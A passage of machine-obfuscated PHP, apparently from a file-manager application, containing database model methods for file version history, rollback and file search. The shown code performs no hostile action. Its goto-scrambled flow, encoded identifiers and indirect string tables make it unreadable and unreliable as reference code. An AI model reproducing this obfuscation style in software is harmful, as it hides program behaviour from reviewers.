$e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[84]] = $B‘§µ­ŸÙù[$e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[387]]]; $e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[1865]] = $B‘§µ­ŸÙù[$e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[1852]]]; if ($e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[29]] == $E‡ß±µÃÓˆ[1604]) { $e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[1865]] = $e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[84]]; $e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[1852]] = $e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[1865]][$E‡ß±µÃÓˆ[387]]; $e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[84]] = !1; $e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[387]] = $E‡ß±µÃÓˆ[33]; } $e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[1796]] = $B¦¶­½§Öñ[$e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[1479]]]; } unset($e¾Ø¥Ç™‚); goto Bà»Èˆ®êÑ; CÀ”¦ó‰Éš: $Döİ±Å¡ÀÁ = array_to_keyvalue($dªƒÓ¨™É, $E‡ß±µÃÓˆ[33], $E‡ß±µÃÓˆ[1852]); foreach ($dªƒÓ¨™É as $e¾Ø¥Ç™‚) { $dêÜ««óÄÚ = $e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[422]]; if ($e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[29]] == $E‡ß±µÃÓˆ[509] && isset($dêÜ««óÄÚ[$E‡ß±µÃÓˆ[1006]])) { $a“ˆŞƒŸÆ­[] = $dêÜ««óÄÚ[$E‡ß±µÃÓˆ[1006]] . $E‡ß±µÃÓˆ[33]; $a“ˆŞƒŸÆ­[] = $dêÜ««óÄÚ[$E‡ß±µÃÓˆ[1007]] . $E‡ß±µÃÓˆ[33]; } if ($e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[29]] == $E‡ß±µÃÓˆ[1860] && isset($dêÜ««óÄÚ[$E‡ß±µÃÓˆ[387]])) { $a“ˆŞƒŸÆ­[] = $dêÜ««óÄÚ[$E‡ß±µÃÓˆ[387]] . $E‡ß±µÃÓˆ[33]; } } $a“ˆŞƒŸÆ­ = array_merge($a“ˆŞƒŸÆ­, $Döİ±Å¡ÀÁ, array($AÁğºµêÍ . $E‡ß±µÃÓˆ[33])); goto aÜ²™‘Š¿‘; Bà»Èˆ®êÑ: $c¡ôÛºœÈ[$E‡ß±µÃÓˆ[363]] = $dªƒÓ¨™É; return $c¡ôÛºœÈ; goto Aù…ÆÌ¤Œ»; cˆ™÷Öøœ—: $E‡ß±µÃÓˆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dªƒÓ¨™É = $c¡ôÛºœÈ[$E‡ß±µÃÓˆ[363]]; $a“ˆŞƒŸÆ­ = array_to_keyvalue($dªƒÓ¨™É, $E‡ß±µÃÓˆ[33], $E‡ß±µÃÓˆ[387]); goto CÀ”¦ó‰Éš; Aù…ÆÌ¤Œ»: } public function removeBySource($EÆÂ¥õô‡ï) { $D”Ê™¨Ù¹§ = array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][401] => $EÆÂ¥õô‡ï); $this->where($D”Ê™¨Ù¹§)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\162\143\145\x5f\x68\x69\x73\x74\157\162\x79"; public function historyCount($e¶Ş˜“ˆ¥Ë) { goto B¶¹©¶ßÍª; B¶¹©¶ßÍª: $fğÈ¯¯ˆ¦È =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$e¶Ş˜“ˆ¥Ë) { return array(); } if (is_string($e¶Ş˜“ˆ¥Ë) || is_int($e¶Ş˜“ˆ¥Ë)) { $e¶Ş˜“ˆ¥Ë = array($e¶Ş˜“ˆ¥Ë); } goto fª¡õ†ä…í; E´—ŒŒÃ»¨: return array_to_keyvalue($bºŒ˜‡ßßğ, $fğÈ¯¯ˆ¦È[387], $fğÈ¯¯ˆ¦È[1671]); goto dŠ„«ä‘©Ñ; fª¡õ†ä…í: $AäâïµãÎõ = $fğÈ¯¯ˆ¦È[1866]; $e¼æØ³­ŠÔ = array($fğÈ¯¯ˆ¦È[387] => array($fğÈ¯¯ˆ¦È[7], $e¶Ş˜“ˆ¥Ë)); $bºŒ˜‡ßßğ = $this->field($AäâïµãÎõ)->where($e¼æØ³­ŠÔ)->group($fğÈ¯¯ˆ¦È[387])->select(); goto E´—ŒŒÃ»¨; dŠ„«ä‘©Ñ: } public function addHistory($D¤âÓŠ®Ğõ, $CŒ…ê·¸­ = '') { $BÂÑ˜ÃÊ¼© =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F¸±Üòù„Ù = array($BÂÑ˜ÃÊ¼©[401] => $D¤âÓŠ®Ğõ[$BÂÑ˜ÃÊ¼©[387]], $BÂÑ˜ÃÊ¼©[1471] => isset($D¤âÓŠ®Ğõ[$BÂÑ˜ÃÊ¼©[397]]) ? $D¤âÓŠ®Ğõ[$BÂÑ˜ÃÊ¼©[397]] : $D¤âÓŠ®Ğõ[$BÂÑ˜ÃÊ¼©[396]], $BÂÑ˜ÃÊ¼©[437] => $D¤âÓŠ®Ğõ[$BÂÑ˜ÃÊ¼©[436]], $BÂÑ˜ÃÊ¼©[537] => $D¤âÓŠ®Ğõ[$BÂÑ˜ÃÊ¼©[77]], $BÂÑ˜ÃÊ¼©[1867] => $CŒ…ê·¸­); $cîãŠÏ•ã¢ = $GLOBALS[$BÂÑ˜ÃÊ¼©[6]][$BÂÑ˜ÃÊ¼©[87]][$BÂÑ˜ÃÊ¼©[1054]]; if ($cîãŠÏ•ã¢ > 1) { $this->historyAutoClear($F¸±Üòù„Ù[$BÂÑ˜ÃÊ¼©[387]]); $this->add($F¸±Üòù„Ù); } Hook::trigger($BÂÑ˜ÃÊ¼©[1868], $F¸±Üòù„Ù); Model($BÂÑ˜ÃÊ¼©[1869])->eventFileEdit($D¤âÓŠ®Ğõ[$BÂÑ˜ÃÊ¼©[387]]); } private function historyAutoClear($c—šïÇ˜ÈÚ) { goto e±ŸÎã˜; e±ŸÎã˜: $E»Ğ¡­Ä‡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c‡·˜Í®Îô = Model($E»Ğ¡­Ä‡[1075])->get($E»Ğ¡­Ä‡[1076]); $A“Ñ³ÊÂÕ« = $GLOBALS[$E»Ğ¡­Ä‡[6]][$E»Ğ¡­Ä‡[87]][$E»Ğ¡­Ä‡[1054]]; goto EˆÎôŒ§õÙ; EˆÎôŒ§õÙ: $e­Ó½µËÚŒ = $c‡·˜Í®Îô == $E»Ğ¡­Ä‡[1077] ? 5 : $A“Ñ³ÊÂÕ«; if ($A“Ñ³ÊÂÕ« <= 1) { $e­Ó½µËÚŒ = 1; } if ($e­Ó½µËÚŒ >= 500) { return; } goto D£ÕÔøÆÓ°; A¨¤ñØò²¿: $this->where($f¿¤«ë£½)->delete(); Model($E»Ğ¡­Ä‡[439])->remove($Fˆ»‡”Ú©‡); goto b·Õ±ô¤°é; EÈŒÜ§×Á¤: $aƒ Á‰‹“ = array_to_keyvalue($CšÊ÷¬÷ğ„, $E»Ğ¡­Ä‡[33], $E»Ğ¡­Ä‡[385]); $aƒ Á‰‹“ = array_slice($aƒ Á‰‹“, $e­Ó½µËÚŒ); $Fˆ»‡”Ú©‡ = array_to_keyvalue($CšÊ÷¬÷ğ„, $E»Ğ¡­Ä‡[33], $E»Ğ¡­Ä‡[436]); goto F¯±Õ‘„É; F¯±Õ‘„É: $Fˆ»‡”Ú©‡ = array_slice($Fˆ»‡”Ú©‡, $e­Ó½µËÚŒ); if (!$aƒ Á‰‹“ || !$Fˆ»‡”Ú©‡) { return; } $f¿¤«ë£½ = array($E»Ğ¡­Ä‡[403] => array($E»Ğ¡­Ä‡[7], $aƒ Á‰‹“)); goto A¨¤ñØò²¿; D£ÕÔøÆÓ°: $f¿¤«ë£½ = array($E»Ğ¡­Ä‡[401] => $c—šïÇ˜ÈÚ); $CšÊ÷¬÷ğ„ = $this->field($E»Ğ¡­Ä‡[1870])->where($f¿¤«ë£½)->order($E»Ğ¡­Ä‡[1863])->select(); if (!$CšÊ÷¬÷ğ„ || $e­Ó½µËÚŒ >= count($CšÊ÷¬÷ğ„)) { return; } goto EÈŒÜ§×Á¤; b·Õ±ô¤°é: } public function listData($a›¼ƒç•‡Ë) { goto FõÜ· Úø; D‘·Äµô¿«: $F¢Å¦™·ÃÚ = 5; if ($B†¨§õÒ±Ã == $F»½Íèã¾º[1077]) { $d§ÜãæÌ†[$F»½Íèã¾º[363]] = array_slice($d§ÜãæÌ†[$F»½Íèã¾º[363]], 0, $F¢Å¦™·ÃÚ); $d§ÜãæÌ†[$F»½Íèã¾º[360]] = array($F»½Íèã¾º[1872] => 1, $F»½Íèã¾º[1873] => 20, $F»½Íèã¾º[1874] => 1, $F»½Íèã¾º[1875] => count($d§ÜãæÌ†[$F»½Íèã¾º[363]])); } return $d§ÜãæÌ†; goto Bå×·Ê–ŠÎ; aì¸Ï„«ÍÅ: $d§ÜãæÌ† = $this->field($B»»Ê‹ÍÇ…)->where($a¢ï‹’íÓ)->order($F»½Íèã¾º[1863])->selectPage(); $this->_listAppendUser($d§ÜãæÌ†[$F»½Íèã¾º[363]]); $B†¨§õÒ±Ã = Model($F»½Íèã¾º[1075])->get($F»½Íèã¾º[1076]); goto D‘·Äµô¿«; FõÜ· Úø: $F»½Íèã¾º =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $a¢ï‹’íÓ = array($F»½Íèã¾º[401] => $a›¼ƒç•‡Ë); $B»»Ê‹ÍÇ… = $F»½Íèã¾º[1871]; goto aì¸Ï„«ÍÅ; Bå×·Ê–ŠÎ: } protected function _listAppendUser(&$e­î­è¼¶´) { $F…çÌ…Ø‰ì =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Fœ‹¯§‰®¦ = array_to_keyvalue($e­î­è¼¶´, $F…çÌ…Ø‰ì[33], $F…çÌ…Ø‰ì[1479]); $D÷ÛÎÅÍ™† = Model($F…çÌ…Ø‰ì[495])->userListInfo($Fœ‹¯§‰®¦); foreach ($e­î­è¼¶´ as &$aÅ¦¤ š”“) { $B¶É§ç…Ò’ = $aÅ¦¤ š”“[$F…çÌ…Ø‰ì[1479]]; $aÅ¦¤ š”“[$F…çÌ…Ø‰ì[396]] = $D÷ÛÎÅÍ™†[$B¶É§ç…Ò’] ? $D÷ÛÎÅÍ™†[$B¶É§ç…Ò’] : !1; } unset($aÅ¦¤ š”“); } public function fileInfo($a™ÍÖ¯êÒ) { $bîğˆŸ«ÚĞ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bä»¯Ê‹–Â = $this->tablePrefix; $dŒÁ×Š«õŠ = "{$bä»¯Ê‹–Â}\151\157\137\146\151\154\x65\x20\x66\151\x6c\145\163\x20\157\156\x20\146\x69\x6c\x65\x73\56\146\151\154\145\111\104\40\x3d\40\x68\x69\163\164\157\162\171\56\146\151\x6c\x65\x49\x44"; return $this->alias($bîğˆŸ«ÚĞ[1876])->where(array($bîğˆŸ«ÚĞ[403] => $a™ÍÖ¯êÒ))->join($dŒÁ×Š«õŠ, $bîğˆŸ«ÚĞ[1877])->find(); } public function removeItem($c—‚Ğôæµ) { $c‹ò ùÁƒŠ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $còõ©Û¨ª° = array($c‹ò ùÁƒŠ[403] => $c—‚Ğôæµ); $AÚŠ¬¸®êĞ = $this->where($còõ©Û¨ª°)->find(); if ($AÚŠ¬¸®êĞ) { $EõÜ¹ÏÈØ‘ = $this->where($còõ©Û¨ª°)->delete(); Model($c‹ò ùÁƒŠ[439])->remove($AÚŠ¬¸®êĞ[$c‹ò ùÁƒŠ[436]]); return $EõÜ¹ÏÈØ‘; } return !1; } public function removeBySource($A·×´ÁãÕ) { goto DçÖè¶õµ; aòÇ¸ÜÔ°: $D’®Ì²«¥› = array($Bä¢Ç•›Á…[401] => array($Bä¢Ç•›Á…[7], $A·×´ÁãÕ)); $Dà½»’Üœò = $this->field($Bä¢Ç•›Á…[437])->where($D’®Ì²«¥›)->select(); if ($Dà½»’Üœò) { $this->where($D’®Ì²«¥›)->delete(); $FÀôƒ  ô· = array_to_keyvalue($Dà½»’Üœò, $Bä¢Ç•›Á…[33], $Bä¢Ç•›Á…[436]); Model($Bä¢Ç•›Á…[439])->remove($FÀôƒ  ô·); } goto d¸ööÎ„’; DçÖè¶õµ: $Bä¢Ç•›Á… =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$A·×´ÁãÕ) { return !1; } if (!is_array($A·×´ÁãÕ)) { $A·×´ÁãÕ = array($A·×´ÁãÕ); } goto aòÇ¸ÜÔ°; d¸ööÎ„’: return !0; goto e±çîœĞçÖ; e±çîœĞçÖ: } public function setDetail($D¡ÍÓ’Ş, $DŠĞ…´½±¹) { $EÉíËŒÁ´ƒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return $this->where(array($EÉíËŒÁ´ƒ[403] => $D¡ÍÓ’Ş))->save(array($EÉíËŒÁ´ƒ[1867] => $DŠĞ…´½±¹)); } public function rollbackToItem($E˜¤î¹å‚ù, $bÎÛö™¢÷ó) { goto dÒá««¢Õ·; BùàåÄÄ¢: $FÄ„à‘ñÌ = $this->find($bÎÛö™¢÷ó); $F ö‰Ã÷» = array($a†¥ìª©„Ä[436] => $FÄ„à‘ñÌ[$a†¥ìª©„Ä[436]], $a†¥ìª©„Ä[77] => $FÄ„à‘ñÌ[$a†¥ìª©„Ä[77]], $a†¥ìª©„Ä[83] => time(), $a†¥ìª©„Ä[397] => USER_ID); Model($a†¥ìª©„Ä[745])->where(array($a†¥ìª©„Ä[387] => $E˜¤î¹å‚ù))->save($F ö‰Ã÷»); goto BŞ±ÄßÇ†š; BŞ±ÄßÇ†š: return $this->where(array($a†¥ìª©„Ä[403] => $bÎÛö™¢÷ó))->delete(); goto DÑÑä½Şà; dÒá««¢Õ·: $a†¥ìª©„Ä =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E¯¹ÖÑ«Ó = Model($a†¥ìª©„Ä[745])->sourceInfo($E˜¤î¹å‚ù); $this->addHistory($E¯¹ÖÑ«Ó, LNG($a†¥ìª©„Ä[1878])); goto BùàåÄÄ¢; DÑÑä½Şà: } public function clearSame($bôÈó¦å¥×) { goto f‚Ì‘á‹Æß; f‚Ì‘á‹Æß: $fª¯šÒôÒà =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D¸†¬Ÿ‹¢ = $this->listData($bôÈó¦å¥×); $E¿êèˆ•´¤ = array_to_keyvalue_group($D¸†¬Ÿ‹¢, $fª¯šÒôÒà[436]); goto eçö‹Ø‘à¨; d‹•ó¢Ğˆ: if (!$Dµ—ˆÁòÛ¸) { return; } $this->where(array($fª¯šÒôÒà[385] => array($fª¯šÒôÒà[7], $Dµ—ˆÁòÛ¸)))->delete(); Model($fª¯šÒôÒà[439])->remove($D³š¹¨¨öÖ); goto B‹‘­»¹ñÅ; eçö‹Ø‘à¨: $D³š¹¨¨öÖ = array(); $Dµ—ˆÁòÛ¸ = array(); foreach ($E¿êèˆ•´¤ as $eåÚËÏÈ) { if (!$eåÚËÏÈ || count($eåÚËÏÈ) <= 1) { continue; } foreach ($eåÚËÏÈ as $Eé¿½) { $D³š¹¨¨öÖ[] = $Eé¿½[$fª¯šÒôÒà[436]]; $Dµ—ˆÁòÛ¸[] = $Eé¿½[$fª¯šÒôÒà[385]]; } } goto d‹•ó¢Ğˆ; B‹‘­»¹ñÅ: } public function userSpace() { $e›†Š†±–ˆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F‹óõÊ© = $this->tablePrefix; $C¡‚–‘¡Õ¤ = array($e›†Š†±–ˆ[1471] => USER_ID); $Aã±ğŞ = "{$F‹óõÊ©}\x69\157\x5f\146\151\154\x65\x20\146\151\154\x65\x73\x20\x6f\156\x20\x66\151\x6c\x65\x73\56\146\151\154\x65\111\x44\40\75\x20\150\151\x73\x74\x6f\162\x79\x2e\146\x69\154\x65\x49\104"; return $this->alias($e›†Š†±–ˆ[1876])->where($C¡‚–‘¡Õ¤)->join($Aã±ğŞ, $e›†Š†±–ˆ[1877])->sum($e›†Š†±–ˆ[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($eå°¢Õœ§Ï) { goto f’ĞóŒŠ–µ; f’ĞóŒŠ–µ: $E¹¤¼ùù»ù =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d¦ò«¿„ = KodIO::fileTypeList(); $AíØ°È–¯Š = $d¦ò«¿„[$eå°¢Õœ§Ï]; goto Eµ™ˆ‰Æ ; e†ºîé‘¼: if (!$AíØ°È–¯Š[$E¹¤¼ùù»ù[167]]) { $d‚ãöÀè† = array_to_keyvalue($d¦ò«¿„, $E¹¤¼ùù»ù[33], $E¹¤¼ùù»ù[167]); $C†Æ¨ÑÃÃÀ = implode($E¹¤¼ùù»ù[47], $d‚ãöÀè†); $AÆÃÜßçš = $E¹¤¼ùù»ù[1879]; } $F‰´ äçô = explode($E¹¤¼ùù»ù[47], trim($C†Æ¨ÑÃÃÀ, $E¹¤¼ùù»ù[47])); return array($AÆÃÜßçš, $F‰´ äçô); goto BÜÊåí’Çù; Eµ™ˆ‰Æ : if (!$AíØ°È–¯Š) { return array(); } $C†Æ¨ÑÃÃÀ = $AíØ°È–¯Š[$E¹¤¼ùù»ù[167]]; $AÆÃÜßçš = $E¹¤¼ùù»ù[7]; goto e†ºîé‘¼; BÜÊåí’Çù: } public function listPathType($D•»îõï•÷) { $aí¸§¢¡àµ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bòİ ’ô¸ = $this->fileTypeWhere($D•»îõï•÷); if (!$bòİ ’ô¸) { return array(); } $A÷ñ­ÒÀ´ƒ = array($aí¸§¢¡àµ[538] => SourceModel::TYPE_USER, $aí¸§¢¡àµ[539] => USER_ID, $aí¸§¢¡àµ[535] => 0, $aí¸§¢¡àµ[536] => $bòİ ’ô¸); return $this->listSource($A÷ñ­ÒÀ´ƒ); } public function listSearch($fÛ‹¿¹¸, $e¨½ä‘ğó = 300) { goto bØ×”¾˜Ş³; fÑ˜«ïÇÌ: if (!isset($eİÔ©Ä·ÄÚ[$cÎÜÇšƒ¢µ[414]])) { $eİÔ©Ä·ÄÚ[$cÎÜÇšƒ¢µ[414]] = 0; } $C´Éø÷è¸„ = $cÎÜÇšƒ¢µ[1881]; $E÷ƒ“êÃ¬ = $C´Éø÷è¸„; goto Fˆ¸‡®Àã–; A“Ì³Å›º’: return $eƒèäêõ; goto DŒê¶„©µ–; bØ×”¾˜Ş³: $cÎÜÇšƒ¢µ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (isset($fÛ‹¿¹¸[$cÎÜÇšƒ¢µ[1723]]) && $fÛ‹¿¹¸[$cÎÜÇšƒ¢µ[1723]]) { $fÛ‹¿¹¸[$cÎÜÇšƒ¢µ[1723]] = str_replace($cÎÜÇšƒ¢µ[376], $cÎÜÇšƒ¢µ[1880], trim($fÛ‹¿¹¸[$cÎÜÇšƒ¢µ[1723]])); } $eİÔ©Ä·ÄÚ = $this->_parseSearchWhere($fÛ‹¿¹¸); goto fÑ˜«ïÇÌ; Fˆ¸‡®Àã–: $this->_listSearchBindPinyin($fÛ‹¿¹¸, $eİÔ©Ä·ÄÚ, $C´Éø÷è¸„); $this->alias($cÎÜÇšƒ¢µ[505])->_makeOrder(); $eİÔ©Ä·ÄÚ = $this->parseWhereLike($eİÔ©Ä·ÄÚ); goto D¿ºÂù°ôÂ; E‚êĞ»»É’: $this->_listSearchGroupTag($eƒèäêõ, $fÛ‹¿¹¸, $E÷ƒ“êÃ¬); $this->_listDataApply($eƒèäêõ[$cÎÜÇšƒ¢µ[363]]); $this->_listMake($eƒèäêõ); goto A“Ì³Å›º’; D¿ºÂù°ôÂ: $eƒèäêõ = $this->distinct(!0)->field($C´Éø÷è¸„)->where($eİÔ©Ä·ÄÚ)->selectPage($e¨½ä‘ğó); $this->_listSearchDesc($eƒèäêõ, $fÛ‹¿¹¸, $E÷ƒ“êÃ¬); $this->_listSearchTag($eƒèäêõ, $fÛ‹¿¹¸, $E÷ƒ“êÃ¬); goto E‚êĞ»»É’; DŒê¶„©µ–: } private function _listSearchTag(&$E›±Û¬ëè, $B¤˜ß…‰Ï¥, $D¹÷ÑØô½Ì) { goto C…’åèã¨š; C…’åèã¨š: $DøŒ‰ïÔ‘À =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$B¤˜ß…‰Ï¥[$DøŒ‰ïÔ‘À[1723]] || $E›±Û¬ëè[$DøŒ‰ïÔ‘À[360]][$DøŒ‰ïÔ‘À[349]] > 1) { return; } $DØ¢›†Ú¨ã = Model($DøŒ‰ïÔ‘À[1882])->listData(); goto E­Åê•; C¸ò”–ä´: if (!$Dˆª¯ºğ¢) { return; } $AĞœîÁİ™º = array($DøŒ‰ïÔ‘À[410] => array($DøŒ‰ïÔ‘À[7], $Dˆª¯ºğ¢), $DøŒ‰ïÔ‘À[1479] => USER_ID); $Câ‘˜„¢–– = Model($DøŒ‰ïÔ‘À[411])->field($DøŒ‰ïÔ‘À[75])->where($AĞœîÁİ™º)->select(); goto d»ˆè¥Ï”É; E­Åê•: $Dˆª¯ºğ¢ = array(); $B“»ŒÛøŠ° = $B¤˜ß…‰Ï¥[$DøŒ‰ïÔ‘À[1723]]; foreach ($DØ¢›†Ú¨ã as $eŠ›³•¹œ÷) { $CÄ‡ƒéëË = $eŠ›³•¹œ÷[$DøŒ‰ïÔ‘À[28]]; $CŞ˜–ÑÔ»÷ = str_replace($DøŒ‰ïÔ‘À[50], $DøŒ‰ïÔ‘À[33], Pinyin::encode($CÄ‡ƒéëË)); if (stripos($CÄ‡ƒéëË, $B“»ŒÛøŠ°) !== !1 || stripos($CŞ˜–ÑÔ»÷, $B“»ŒÛøŠ°) !== !1) { $Dˆª¯ºğ¢[] = $eŠ›³•¹œ÷[$DøŒ‰ïÔ‘À[385]]; } } goto C¸ò”–ä´; d»ˆè¥Ï”É: $Câ‘˜„¢–– = array_to_keyvalue($Câ‘˜„¢––, $DøŒ‰ïÔ‘À[33], $DøŒ‰ïÔ‘À[75]); $c±ßßë”ëù = array_unique($Câ‘˜„¢––); $this->_listSearchMerge($E›±Û¬ëè, $B¤˜ß…‰Ï¥, $D¹÷ÑØô½Ì, $c±ßßë”ëù); goto b ·ÎÅŒ±ğ; b ·ÎÅŒ±ğ: } private function _listSearchDesc(&$f‹ù´ä™£µ, $f˜ÀƒœŒ…, $f°ŠÖ—„±…) { goto EĞ›Õ‘î»Ç; FòÃë‘Š¢: $D÷¡Ì‹ŒÌŒ = Model($B’à÷äŠİò[521])->field($B’à÷äŠİò[387])->where($CÚõ¼å¹é‹)->select(); $dì‰±…Æ—Õ = array_to_keyvalue($D÷¡Ì‹ŒÌŒ, $B’à÷äŠİò[33], $B’à÷äŠİò[387]); $this->_listSearchMerge($f‹ù´ä™£µ, $f˜ÀƒœŒ…, $f°ŠÖ—„±…, $dì‰±…Æ—Õ); goto FÖ±Ê—öÔ; d—ÚòëÀ—ù: $C®ÍŞŒÑŒ‡ = array_unique($C®ÍŞŒÑŒ‡); if (!$C®ÍŞŒÑŒ‡) { return; } $CÚõ¼å¹é‹ = array($B’à÷äŠİò[387] => array($B’à÷äŠİò[7], $C®ÍŞŒÑŒ‡), $B’à÷äŠİò[92] => $B’à÷äŠİò[422], $B’à÷äŠİò[368] => array($B’à÷äŠİò[375], $B’à÷äŠİò[1725] . $f˜ÀƒœŒ…[$B’à÷äŠİò[1723]] . $B’à÷äŠİò[1725])); goto FòÃë‘Š¢; EĞ›Õ‘î»Ç: $B’à÷äŠİò =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$f˜ÀƒœŒ…[$B’à÷äŠİò[1723]] || $f‹ù´ä™£µ[$B’à÷äŠİò[360]][$B’à÷äŠİò[349]] > 1) { return; } $C®ÍŞŒÑŒ‡ = $this->listSearchChildren($f˜ÀƒœŒ…[$B’à÷äŠİò[479]]); goto d—ÚòëÀ—ù; FÖ±Ê—öÔ: } private function _listSearchGroupTag(&$Cö’°Öóîç, $bÜÂåëƒó, $aæ“‰‰”–) { goto aù¥æõå’Ñ; aßË«ñÛÕ‘: if (!$c«ØÏåÕî) { return; } $EŠÖ¡Ç¶× = array($eƒì–­åÅÇ[410] => array($eƒì–­åÅÇ[7], $c«ØÏåÕî), $eƒì–­åÅÇ[1479] => 0, $eƒì–­åÅÇ[29] => $eƒì–­åÅÇ[1743] . $dÓññÚòê¡); $FÀÛ˜Ú¾™Ö = Model($eƒì–­åÅÇ[411])->field($eƒì–­åÅÇ[75])->where($EŠÖ¡Ç¶×)->select(); goto BŒÑÂñŸÛÇ; BŒÑÂñŸÛÇ: $FÀÛ˜Ú¾™Ö = array_to_keyvalue($FÀÛ˜Ú¾™Ö, $eƒì–­åÅÇ[33], $eƒì–­åÅÇ[75]); $FÄåõÑìĞ = array_unique($FÀÛ˜Ú¾™Ö); $this->_listSearchMerge($Cö’°Öóîç, $bÜÂåëƒó, $aæ“‰‰”–, $FÄåõÑìĞ); goto bÜÛ»–Çˆå; eäÍÃÍ¸: $c«ØÏåÕî = array(); $F¢‚²Ô¯‘‡ = $bÜÂåëƒó[$eƒì–­åÅÇ[1723]]; foreach ($Fã÷‰‰Óæâ[$eƒì–­åÅÇ[363]] as $D±Ü¬â¸ï) { $aŠ”†Õ•ŸÔ = $D±Ü¬â¸ï[$eƒì–­åÅÇ[28]]; $F‚ÒÚÊµ˜• = str_replace($eƒì–­åÅÇ[50], $eƒì–­åÅÇ[33], Pinyin::encode($aŠ”†Õ•ŸÔ)); if (stripos($aŠ”†Õ•ŸÔ, $F¢‚²Ô¯‘‡) !== !1 || stripos($F‚ÒÚÊµ˜•, $F¢‚²Ô¯‘‡) !== !1) { $c«ØÏåÕî[] = $D±Ü¬â¸ï[$eƒì–­åÅÇ[385]]; } } goto aßË«ñÛÕ‘; F™‘½Œâ˜¸: if (!$F³Õ‹ÑÀì¹ || $F³Õ‹ÑÀì¹[$eƒì–­åÅÇ[389]] != SourceModel::TYPE_GROUP) { return; } $dÓññÚòê¡ = $F³Õ‹ÑÀì¹[$eƒì–­åÅÇ[474]]; $Fã÷‰‰Óæâ = Model($eƒì–­åÅÇ[1883])->get($dÓññÚòê¡); goto eäÍÃÍ¸; aù¥æõå’Ñ: $eƒì–­åÅÇ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$bÜÂåëƒó[$eƒì–­åÅÇ[1723]] || $Cö’°Öóîç[$eƒì–­åÅÇ[360]][$eƒì–­åÅÇ[349]] > 1 || !$bÜÂåëƒó[$eƒì–­åÅÇ[479]]) { return; } $F³Õ‹ÑÀì¹ = $this->sourceInfo($bÜÂåëƒó[$eƒì–­åÅÇ[479]]); goto F™‘½Œâ˜¸; bÜÛ»–Çˆå: } private function _listSearchMerge(&$CØ¤Ò¤ŒÀÕ, $Bî‡³»¾õÑ, $Fµ·‰”ÛŒ’, $B»¼®÷ÆƒÅ) { goto e¶Ìš‹¨Áğ; EÒ”ƒ÷†­À: foreach ($b‹óóÊ°÷ as $EÚŠ’‰šŸğ) { $a—ÜáŞÎÙí = $CÀÏ°ôæ÷­[47] . $Bî‡³»¾õÑ[$CÀÏ°ôæ÷­[479]] . $CÀÏ°ôæ÷­[47]; if (stripos($EÚŠ’‰šŸğ[$CÀÏ°ôæ÷­[477]], $a—ÜáŞÎÙí) !== !1) { $CÜö¤ƒ«­[] = $EÚŠ’‰šŸğ; } } $CØ¤Ò¤ŒÀÕ[$CÀÏ°ôæ÷­[363]] = array_merge($CÜö¤ƒ«­, $CØ¤Ò¤ŒÀÕ[$CÀÏ°ôæ÷­[363]]); $CØ¤Ò¤ŒÀÕ[$CÀÏ°ôæ÷­[360]][$CÀÏ°ôæ÷­[361]] += count($CÜö¤ƒ«­); goto eÃ÷ÎÒ•Ï; C‹÷Ë¼Ø„¶: $aß¨´¸ˆ²Ø = array_diff($B»¼®÷ÆƒÅ, $d‰Ã¾Ğõù); if (!$aß¨´¸ˆ²Ø) { return; } $B¬É¾ëñØÄ = array($CÀÏ°ôæ÷­[387] => array($CÀÏ°ôæ÷­[7], $aß¨´¸ˆ²Ø)); goto eŸ‘æ“°; eŸ‘æ“°: $b‹óóÊ°÷ = $this->field($Fµ·‰”ÛŒ’)->where($B¬É¾ëñØÄ)->select(); if (!$b‹óóÊ°÷) { return; } $CÜö¤ƒ«­ = array(); goto EÒ”ƒ÷†­À; e¶Ìš‹¨Áğ: $CÀÏ°ôæ÷­ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$B»¼®÷ÆƒÅ) { return; } $d‰Ã¾Ğõù = array_to_keyvalue($CØ¤Ò¤ŒÀÕ[$CÀÏ°ôæ÷­[363]], $CÀÏ°ôæ÷­[33], $CÀÏ°ôæ÷­[387]); goto C‹÷Ë¼Ø„¶; eÃ÷ÎÒ•Ï: } public function listSearchChildren($E¬ÉÙ ã‘©, $c…Ôˆˆ“ÚÄ = 5000) { goto D½ğ‘–Ñ¢; a’ì‚šœ…ì: $câ‡¥æ”ĞË = array($D»ùòí¾„£[477] => array($D»ùòí¾„£[375], $C‡ëã«•˜ò[$D»ùòí¾„£[477]] . 